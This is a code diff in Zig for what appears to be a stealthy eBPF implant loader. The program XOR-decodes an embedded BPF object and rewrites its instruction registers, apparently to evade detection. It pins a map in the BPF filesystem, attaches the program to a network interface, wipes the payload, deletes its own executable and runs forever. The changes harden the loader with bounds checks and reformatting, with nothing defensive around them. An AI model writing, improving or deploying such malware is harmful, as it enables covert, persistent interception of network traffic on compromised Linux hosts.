@@ -6,7 +6,9 @@ pub fn _start() noreturn {
     inline for (0..bpf_blob.len) |idx| { bpf_blob[idx] ^= 0x7A; }
 
     const meta = parse_elf(bpf_blob);
-    mutate_regs(bpf_blob[meta.offset .. meta.offset + meta.size]);
+    if (meta.size > 0) {
+        mutate_regs(bpf_blob[meta.offset .. meta.offset + meta.size]);
+    }
 
     const iface = find_iface();
     const stack = sc.mmap(0, 65536, 3, 0x22, -1, 0);
@@ -27,11 +29,18 @@ pub fn _start() noreturn {
     }, 72);
 
     _ = sc.mkdir("/sys/fs/bpf/zt", 0o755);
-    _ = sc.bpf_syscall(17, &sc.bpf_attr_pin{ .path = @intFromPtr("/sys/fs/bpf/zt/map"), .fd = @intCast(map_fd) }, 16);
+    _ = sc.bpf_syscall(17, &sc.bpf_attr_pin{ 
+        .path = @intFromPtr("/sys/fs/bpf/zt/map"), 
+        .fd = @intCast(map_fd) 
+    }, 16);
 
     @memset(bpf_blob, 0);
 
-    _ = sc.bpf_syscall(28, &sc.bpf_attr_link{ .prog_fd = @intCast(prog_fd), .target_ifindex = iface, .attach_type = 37 }, 64);
+    _ = sc.bpf_syscall(28, &sc.bpf_attr_link{ 
+        .prog_fd = @intCast(prog_fd), 
+        .target_ifindex = iface, 
+        .attach_type = 37 
+    }, 64);
 
     _ = sc.unlink("/proc/self/exe");
     while (true) { _ = sc.nanosleep(3600); }
@@ -39,7 +48,7 @@ pub fn _start() noreturn {
 
 fn mutate_regs(insns: []u8) void {
     var i: usize = 0;
-    while (i < insns.len) : (i += 8) {
+    while (i + 8 <= insns.len) : (i += 8) {
         if (insns[i] == 0x07 or insns[i] == 0x0f) {
             const regs = insns[i + 1];
             insns[i + 1] = ((regs & 0x0F) << 4) | ((regs & 0xF0) >> 4);
@@ -73,11 +82,19 @@ fn get_idx(name: []const u8) u32 {
 }
 
 fn parse_elf(blob: []u8) struct { offset: u64, size: u64 } {
+    if (blob.len < 64) return .{ .offset = 0, .size = 0 };
     const shoff = @as(*u64, @ptrFromInt(@intFromPtr(blob.ptr) + 40)).*;
     const shnum = @as(*u16, @ptrFromInt(@intFromPtr(blob.ptr) + 60)).*;
+    const shentsize = @as(*u16, @ptrFromInt(@intFromPtr(blob.ptr) + 58)).*;
+    
     for (0..shnum) |i| {
-        const ptr = @intFromPtr(blob.ptr) + shoff + (i * 64);
-        if (@as(*u32, @ptrFromInt(ptr + 4)).* == 1) return .{ .offset = @as(*u64, @ptrFromInt(ptr + 24)).*, .size = @as(*u64, @ptrFromInt(ptr + 32)).* };
+        const ptr = @intFromPtr(blob.ptr) + shoff + (i * shentsize);
+        if (@as(*u32, @ptrFromInt(ptr + 4)).* == 1) {
+            return .{ 
+                .offset = @as(*u64, @ptrFromInt(ptr + 24)).*, 
+                .size = @as(*u64, @ptrFromInt(ptr + 32)).* 
+            };
+        }
     }
     return .{ .offset = 0, .size = 0 };
 }
